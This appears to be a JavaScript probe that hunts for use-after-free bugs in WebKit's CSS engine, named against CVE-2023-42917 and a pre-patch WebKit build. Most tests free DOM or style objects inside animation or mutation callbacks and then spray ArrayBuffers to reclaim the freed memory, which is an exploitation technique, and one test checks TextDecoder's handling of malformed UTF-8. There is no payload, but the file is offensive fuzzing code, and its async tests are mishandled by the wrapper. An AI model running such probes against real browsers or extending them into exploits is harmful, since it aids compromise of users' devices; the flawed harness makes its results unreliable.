// CSS/DOM UAF probe — targeting CVE-2023-42917 area (CSS processing)
// WebKit 613.0 is pre-patch for this CVE (fixed in Safari 17.1.2)
(function() {
'use strict';

var results = [];

function test(name, fn) {
  try {
    var r = fn();
    r.name = name;
    results.push(r);
  } catch(e) {
    results.push({ name: name, error: e.message.substring(0, 80) });
  }
}

// ─── Test 1: CSS animation removal during callback ───
test('anim_remove_callback', function() {
  return new Promise(function(resolve) {
    var div = document.createElement('div');
    div.style.cssText = 'width:100px;height:100px;position:absolute;left:0';

    var style = document.createElement('style');
    style.textContent = '@keyframes slide{from{left:0}to{left:200px}} .go{animation:slide .01s linear forwards}';
    document.head.appendChild(style);
    document.body.appendChild(div);

    div.addEventListener('animationstart', function() {
      // Remove during animation start callback
      div.remove();
      style.remove();

      // Allocate to reclaim freed memory
      var spray = [];
      for (var i = 0; i < 100; i++) spray.push(new ArrayBuffer(64));

      // Force layout on a new element
      var div2 = document.createElement('div');
      div2.style.width = '100px';
      document.body.appendChild(div2);
      div2.offsetWidth;
      div2.remove();

      resolve({ result: 'survived', spray: spray.length });
    });

    div.className = 'go';

    setTimeout(function() {
      resolve({ result: 'timeout_no_event' });
    }, 2000);
  });
});

// ─── Test 2: display:contents + animation ───
test('display_contents_anim', function() {
  var style = document.createElement('style');
  style.textContent = '@keyframes fade{from{opacity:1}to{opacity:0}} .dc{display:contents;animation:fade .01s linear}';
  document.head.appendChild(style);

  var parent = document.createElement('div');
  var child = document.createElement('span');
  child.textContent = 'inner';
  parent.appendChild(child);
  document.body.appendChild(parent);

  parent.className = 'dc';
  parent.offsetWidth;

  // Toggle display
  parent.style.display = 'block';
  parent.offsetWidth;
  parent.style.display = 'contents';
  parent.offsetWidth;
  parent.style.display = 'none';
  parent.offsetWidth;

  parent.remove();
  style.remove();

  return { result: 'survived' };
});

// ─── Test 3: position:sticky removal during scroll ───
test('sticky_remove', function() {
  var container = document.createElement('div');
  container.style.cssText = 'height:50px;overflow:auto;position:relative';

  var sticky = document.createElement('div');
  sticky.style.cssText = 'position:sticky;top:0;height:20px;background:red';
  sticky.textContent = 'sticky';

  var spacer = document.createElement('div');
  spacer.style.height = '500px';

  container.appendChild(sticky);
  container.appendChild(spacer);
  document.body.appendChild(container);

  container.scrollTop = 100;
  sticky.remove();
  container.scrollTop = 0;

  // Force layout with new sticky
  var sticky2 = document.createElement('div');
  sticky2.style.cssText = 'position:sticky;top:0;height:20px';
  container.insertBefore(sticky2, spacer);
  container.scrollTop = 200;
  container.offsetHeight;

  container.remove();

  return { result: 'survived' };
});

// ─── Test 4: CSS :has() with rapid DOM mutation ───
test('has_selector_mutation', function() {
  var style = document.createElement('style');
  style.textContent = '.parent:has(.target) { background: red; } .parent:has(.target) > .child { color: blue; }';
  document.head.appendChild(style);

  var parent = document.createElement('div');
  parent.className = 'parent';
  var child = document.createElement('div');
  child.className = 'child';
  parent.appendChild(child);
  document.body.appendChild(parent);

  // Rapid add/remove of .target element
  for (var i = 0; i < 50; i++) {
    var target = document.createElement('span');
    target.className = 'target';
    parent.appendChild(target);
    parent.offsetWidth;
    target.remove();
    parent.offsetWidth;
  }

  parent.remove();
  style.remove();

  return { result: 'survived', iterations: 50 };
});

// ─── Test 5: CSS container queries + size change ───
test('container_query', function() {
  try {
    var style = document.createElement('style');
    style.textContent = '.cq-parent{container-type:inline-size;width:300px} @container(min-width:200px){.cq-child{color:red}}';
    document.head.appendChild(style);

    var parent = document.createElement('div');
    parent.className = 'cq-parent';
    var child = document.createElement('div');
    child.className = 'cq-child';
    child.textContent = 'test';
    parent.appendChild(child);
    document.body.appendChild(parent);

    // Rapid size changes
    for (var i = 0; i < 50; i++) {
      parent.style.width = (50 + i * 10) + 'px';
      parent.offsetWidth;
    }

    parent.remove();
    style.remove();

    return { result: 'survived' };
  } catch(e) {
    return { result: 'error', msg: e.message.substring(0, 60) };
  }
});

// ─── Test 6: @font-face loading + removal ───
test('font_face_remove', function() {
  var style = document.createElement('style');
  style.textContent = '@font-face{font-family:"TestFont";src:url(data:font/woff2;base64,d09GMgAB) format("woff2")} .use-font{font-family:"TestFont",serif}';
  document.head.appendChild(style);

  var el = document.createElement('div');
  el.className = 'use-font';
  el.textContent = 'Test font loading';
  document.body.appendChild(el);
  el.offsetWidth;

  // Remove while font might be loading
  el.remove();
  style.remove();

  // Allocate after removal
  var spray = [];
  for (var i = 0; i < 50; i++) spray.push(new ArrayBuffer(128));

  return { result: 'survived' };
});

// ─── Test 7: CSS transform + will-change + removal ───
test('transform_willchange', function() {
  var els = [];
  for (var i = 0; i < 20; i++) {
    var d = document.createElement('div');
    d.style.cssText = 'width:50px;height:50px;will-change:transform;transform:rotate(' + (i*18) + 'deg)';
    document.body.appendChild(d);
    els.push(d);
  }

  document.body.offsetWidth;

  // Remove in reverse order while changing transforms
  for (var i = els.length - 1; i >= 0; i--) {
    els[i].style.transform = 'scale(0)';
    els[i].remove();
  }

  document.body.offsetWidth;

  return { result: 'survived', count: 20 };
});

// ─── Test 8: TextDecoder fatal mode bug investigation ───
test('textdecoder_fatal', function() {
  if (typeof TextDecoder === 'undefined') return { result: 'not_available' };

  var r = {};

  // Test 1: 0xFF 0xFE (should be invalid UTF-8)
  try {
    var d1 = new TextDecoder('utf-8', { fatal: true });
    d1.decode(new Uint8Array([0xFF, 0xFE]));
    r.ff_fe = 'NO_THROW'; // BUG if this happens
  } catch(e) { r.ff_fe = 'threw_ok'; }

  // Test 2: 0x80 alone (invalid UTF-8 continuation without start)
  try {
    var d2 = new TextDecoder('utf-8', { fatal: true });
    d2.decode(new Uint8Array([0x80]));
    r.lone_cont = 'NO_THROW';
  } catch(e) { r.lone_cont = 'threw_ok'; }

  // Test 3: Overlong encoding (2-byte encoding of ASCII)
  try {
    var d3 = new TextDecoder('utf-8', { fatal: true });
    d3.decode(new Uint8Array([0xC0, 0x80])); // Overlong NUL
    r.overlong = 'NO_THROW';
  } catch(e) { r.overlong = 'threw_ok'; }

  // Test 4: 5-byte sequence (invalid in UTF-8)
  try {
    var d4 = new TextDecoder('utf-8', { fatal: true });
    d4.decode(new Uint8Array([0xF8, 0x80, 0x80, 0x80, 0x80]));
    r.fivebyte = 'NO_THROW';
  } catch(e) { r.fivebyte = 'threw_ok'; }

  // Test 5: Truncated multi-byte (start byte without enough continuation)
  try {
    var d5 = new TextDecoder('utf-8', { fatal: true });
    d5.decode(new Uint8Array([0xE4, 0xB8])); // 3-byte start but only 2 bytes
    r.truncated = 'NO_THROW';
  } catch(e) { r.truncated = 'threw_ok'; }

  // Test 6: Non-fatal mode comparison
  try {
    var d6 = new TextDecoder('utf-8', { fatal: false });
    var out = d6.decode(new Uint8Array([0xFF, 0xFE]));
    r.nonfatal_ff_fe = out.length + '_chars';
    r.nonfatal_codes = [];
    for (var i = 0; i < out.length; i++) r.nonfatal_codes.push(out.charCodeAt(i));
  } catch(e) { r.nonfatal_ff_fe = 'err'; }

  // Test 7: Check if fatal option is actually recognized
  try {
    var d7 = new TextDecoder('utf-8', { fatal: true });
    r.fatalProp = d7.fatal;
  } catch(e) { r.fatalProp = 'err'; }

  return { result: 'textdecoder', data: r };
});

// ─── Test 9: MutationObserver + style recalc race ───
test('mutation_style_race', function() {
  return new Promise(function(resolve) {
    var div = document.createElement('div');
    div.style.cssText = 'width:100px;height:100px';
    document.body.appendChild(div);

    var obs = new MutationObserver(function(mutations) {
      // During callback, force style recalc and remove
      div.style.width = '200px';
      div.offsetWidth;
      div.remove();
      obs.disconnect();

      var spray = [];
      for (var i = 0; i < 100; i++) spray.push(new ArrayBuffer(64));

      resolve({ result: 'survived', mutations: mutations.length });
    });

    obs.observe(div, { attributes: true });
    div.setAttribute('data-test', 'trigger');

    setTimeout(function() {
      resolve({ result: 'timeout' });
    }, 2000);
  });
});

return JSON.stringify(results);
})();
